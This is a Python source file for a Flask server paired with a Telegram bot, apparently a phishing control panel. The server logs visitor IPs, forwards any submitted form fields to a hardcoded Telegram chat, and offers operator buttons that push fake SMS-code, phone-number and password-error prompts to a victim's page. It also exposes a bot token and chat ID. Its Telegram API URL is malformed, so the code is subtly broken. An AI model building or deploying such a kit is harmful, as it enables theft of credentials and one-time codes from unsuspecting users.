import logging
import threading
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ==========================================
# CONFIGURATION
# ==========================================
BOT_TOKEN = "8954791203:AAHQefhXbMp2y0bNHyO_OFW21cIBOjzDxzY"
CHAT_ID = "6546086469" 
CORRECT_VERIFICATION_CODE = "SECRET123"
MY_WEBSITE_URL = "https://lovable.app"

# Initialize Flask application engine
flask_app = Flask(__name__)

# Allows your Lovable website to communicate with this server cleanly
CORS(flask_app, resources={r"/*": {"origins": "https://lovable.app"}})

PORTAL_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Application Portal</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: #ffffff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
        h1 { color: #333333; font-size: 24px; margin-bottom: 10px; }
        p { color: #666666; font-size: 14px; margin-bottom: 20px; }
        .input-field { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #cccccc; border-radius: 4px; box-sizing: border-box; }
        .submit-btn { background-color: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome</h1>
        <p>Please enter your identification code to access the terminal dashboard.</p>
        <form action="#" method="POST">
            <input type="text" name="portal_code" placeholder="Enter Access Code" class="input-field" required autocomplete="off">
            <button type="submit" class="submit-btn">Access Dashboard</button>
        </form>
    </div>
</body>
</html>
"""

def send_alert_to_telegram(message):
    """Dispatches direct URL requests securely to the core Telegram API endpoints."""
    url = f"https://api.telegram.org {BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try: 
        response = requests.post(url, json=payload, timeout=5)
        print(f"Telegram API Status Response: {response.status_code}")
    except Exception as e: 
        print(f"Network error routing alert packet: {e}")

@flask_app.route('/', methods=['GET', 'POST'])
def web_portal_home():
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    log_message = (
        f"🚨 *NEW VISIT DETECTED*\\n\\n"
        f"🌐 *IP Address:* `{visitor_ip}`\\n"
        f"🖥️ *User Agent:* {user_agent}\\n\\n"
        f"Open your bot chat and use /start to view control actions."
    )
    send_alert_to_telegram(log_message)
    return PORTAL_HTML

@flask_app.route('/submit-data', methods=['POST'])
def handle_external_data():
    try:
        data = request.get_json() if request.is_json else request.form.to_dict()
        details = "\\n".join([f"🔹 *{k}:* `{v}`" for k, v in data.items()])
        
        log_message = (
            f"📥 *NEW SUBMISSION RECEIVED*\\n\\n"
            f"{details}\\n\\n"
            f"🌐 *Origin IP:* `{request.remote_addr}`"
        )
        send_alert_to_telegram(log_message)
        return jsonify({"status": "success", "message": "Telemetry logged."}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# ==========================================
# Telegram Bot Async Engine Setup
# ==========================================
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("🔗 Open My Website", url=MY_WEBSITE_URL)],
        [InlineKeyboardButton("🔓 Security Preference", callback_data="header")],
        [
            InlineKeyboardButton("✅ Yes Prompt", callback_data="yes_prompt"),
            InlineKeyboardButton("📱 SMS Code I", callback_data="sms_code_1")
        ],
        [
            InlineKeyboardButton("📱 SMS Code II", callback_data="sms_code_2"),
            InlineKeyboardButton("📞 Number Prompt", callback_data="num_prompt")
        ],
        [
            InlineKeyboardButton("❌ Password Error", callback_data="pass_error"),
            InlineKeyboardButton("🚫 Block Visitor", callback_data="block_visitor")
        ],
        [InlineKeyboardButton("✅ Success", callback_data="success_action")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        text=f"⚙️ *Live Session Controller Menu*:\\nYour tracking domain is set to: {MY_WEBSITE_URL}",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def button_click_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    
    action_messages = {
        "yes_prompt": "🔄 Sending authentication overlay challenge...",
        "sms_code_1": "🔑 Forcing page update to request text authorization code...",
        "sms_code_2": "🔑 Triggering standard backup verification entry code...",
        "num_prompt": "📞 Requesting phone link confirm input box...",
        "pass_error": "❌ Emitting bad password modal to site UI...",
        "block_visitor": "🚫 Blacklist rules deployed. Terminal detached.",
        "success_action": "🎉 Pushing step forwarding redirection commands..."
    }
    await query.message.reply_text(action_messages.get(query.data, "ℹ️ Active status indicator."))

async def verify_text_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.message.text.strip() == CORRECT_VERIFICATION_CODE:
        await update.message.reply_text("✅ Verification match! Code is correct.")
    else:
        await update.message.reply_text("❌ Validation failure. Code is incorrect.")

def init_polling_worker():
    """Runs polling inside an independent background thread cleanly."""
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_click_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, verify_text_code))
    app.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == '__main__':
    bot_worker = threading.Thread(target=init_polling_worker, daemon=True)
    bot_worker.start()
    flask_app.run(host='0.0.0.0', port=5000)
